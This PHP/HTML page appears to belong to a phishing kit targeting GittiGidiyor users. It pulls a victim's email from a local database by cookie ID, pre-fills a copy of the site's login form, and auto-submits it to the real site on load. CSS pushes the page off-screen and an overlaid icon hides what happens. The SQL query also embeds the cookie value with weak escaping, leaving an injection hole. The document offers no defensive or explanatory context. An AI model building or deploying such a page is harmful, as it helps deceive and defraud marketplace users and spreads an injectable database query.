<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `gittigidiyor` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["formlogin"].submit();}</script>



<form id="formlogin" name="formlogin" onSubmit="return ControlLogin()" method="post" action="https://www.gittigidiyor.com/uye-girisi?s=1">	
          <ul>
              <li>
                  <span class="FormTxt">Kullanıcı Adı veya E-posta adresi</span>
                  <input class="FormInput" type="text" tabindex="1" name="kullanici" maxlength="80" size="26" value="<?=$email;?>">
				  <span class="FormTxtWarn dpblock m0"></span>
                  <span class="FormTxtWarn">Lütfen kullanıcı adınızı veya e-posta adresinizi giriniz.</span>
              </li>
              <li>
                  <span class="FormTxt">Şifre</span>
                  <input class="FormInput  " type="password" tabindex="2" name="sifre" maxlength="20" size="26">                  
					                  <span class="FormTxtWarn dpblock m0"></span> 
				  <p class="mt5"><a target="_blank" href="https://www.gittigidiyor.com/sifremi-unuttum" class="link" onClick="pageTracker._trackEvent('Login - Sifremi unuttum', 'Sifremi unuttum - LR - 15.08.12', 'LR-Sifremi unuttum');">Şifremi unuttum</a></p>
              </li>
              <li>
                <table width="100%" cellpadding="0" cellspacing="0">
                    <tbody><tr>
                        <td width="20"><input onClick="pageTracker._trackEvent('Login - Beni hatirla', 'Beni hatirla - LR - 15.08.12', 'LR-Beni hatirla');" type="checkbox" class="m0" name="benihatirla" tabindex="3" id="benihatirla" value="1"></td>
                        <td><label onClick="pageTracker._trackEvent('Login - Beni hatirla', 'Beni hatirla - LR - 15.08.12', 'LR-Beni hatirla');" for="benihatirla">Beni hatırla</label></td>
                    </tr>
                </tbody></table>  
              </li>
			                <li>
				<input type="hidden" name="MYGG" value="Y">
				<input type="hidden" name="js_kontrol" value="1">
				<input type="hidden" name="logfrm" value="1">
				<input type="hidden" name="ITEM" value="">
				<input type="hidden" name="url" value="">
				<input type="hidden" name="pass" value="Üye girişini onaylıyorum">  	
				<input class="button_blue1 button_size3" type="submit" value="Giriş Yap" onClick="pageTracker._trackEvent('Login - Giris Yap', 'Giris Yap - LR - 15.08.12', 'LR-Giris Yap');" tabindex="4" name="pass" alt="Giriş Yap" title="Giriş Yap">
              </li>              
          </ul>
		 </form>

</body>
</html>

